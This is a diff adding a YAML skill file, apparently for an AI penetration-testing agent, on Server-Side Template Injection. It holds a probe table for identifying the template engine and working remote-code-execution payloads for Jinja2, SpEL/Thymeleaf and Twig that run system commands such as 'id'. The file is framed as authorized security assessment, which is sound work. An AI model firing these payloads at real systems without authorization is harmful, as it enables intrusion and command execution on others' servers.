@@ -1,0 +1,58 @@
+schema_version: 1
+version: 3.0.0
+name: ssti
+description: Senior Server-Side Template Injection assessment across Jinja2, Twig, SpEL, Freemarker, Velocity, and ERB — engine fingerprinting, sandbox escape, and RCE verification.
+triggers:
+  - ssti
+  - template injection
+  - jinja
+  - jinja2
+  - twig
+  - spel
+  - freemarker
+  - velocity
+  - thymeleaf
+  - erb
+  - ejs
+tools:
+  - curl
+knowledge: |
+  Assess Server-Side Template Injection (SSTI) with senior red-team precision, focusing on mathematical differential fingerprinting and engine-specific RCE primitives.
+
+  1. DIFFERENTIAL ENGINE FINGERPRINTING MATRIX:
+     SSTI occurs when user input is concatenated into template strings rather than passed as context parameters.
+     Test the universal differential evaluation table to definitively identify the backend engine:
+
+     | Probe Syntax | Result: Jinja2 | Result: Twig | Result: SpEL/Velocity | Result: ERB/EJS |
+     |---|---|---|---|---|
+     | `{{7*7}}`     | `49`           | `49`         | Reflected verbatim    | Reflected verbatim |
+     | `{{7*'7'}}`   | `7777777`      | `49`         | Reflected verbatim    | Reflected verbatim |
+     | `${7*7}`      | Verbatim       | Verbatim     | `49`                  | Verbatim           |
+     | `<%= 7*7 %>`  | Verbatim       | Verbatim     | Verbatim              | `49`               |
+
+  2. JINJA2 / MAKO (PYTHON) EXECUTION PRIMITIVES:
+     - Class MRO Subclass Enumeration:
+       Inspect interpreter classes: `{{''.__class__.__mro__[1].__subclasses__()}}`
+     - Global Builtin Access:
+       • Via cycler: `{{cycler.__init__.__globals__.os.popen('id').read()}}`
+       • Via request context: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
+       • Via config object: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+
+  3. SPEL & THYMELEAF (JAVA) EXECUTION PRIMITIVES:
+     - Spring Expression Language reaches the host runtime via the `T()` type operator:
+       `${T(java.lang.Runtime).getRuntime().exec('id')}`
+     - For reflected output via Process input stream reading:
+       `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`
+
+  4. TWIG (PHP) EXECUTION PRIMITIVES:
+     - Direct filter callback execution:
+       `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
+
+  5. EVIDENCE COLLECTION & VERIFICATION:
+     - Capture the exact reflected mathematical result (`49` or `7777777`) as proof of expression evaluation.
+     - For confirmed RCE, capture command output (`uid=...`) as definitive evidence. Never write persistent backdoors.
+references:
+  - persona:ssti-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/ssti.yaml
